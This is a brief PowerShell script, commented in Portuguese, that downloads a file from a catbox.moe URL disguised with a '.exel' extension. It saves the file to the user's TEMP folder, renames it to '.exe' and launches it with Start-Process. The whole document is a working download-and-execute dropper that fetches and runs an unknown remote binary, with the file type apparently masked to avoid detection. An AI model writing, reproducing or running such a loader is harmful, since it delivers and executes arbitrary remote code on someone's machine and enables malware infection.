# URL do arquivo
$url = "https://files.catbox.moe/uy96rs.exel"

# Caminho onde o arquivo será salvo
$downloadPath = "$env:TEMP\uy96rs.exel"

# Caminho onde o arquivo será renomeado e salvo
$exePath = "$env:TEMP\uy96rs.exe"

# Cria uma instância do WebClient
$webClient = New-Object System.Net.WebClient

# Baixa o arquivo
$webClient.DownloadFile($url, $downloadPath)

# Renomeia o arquivo
Rename-Item -Path $downloadPath -NewName $exePath

# Executa o arquivo
Start-Process -FilePath $exePath
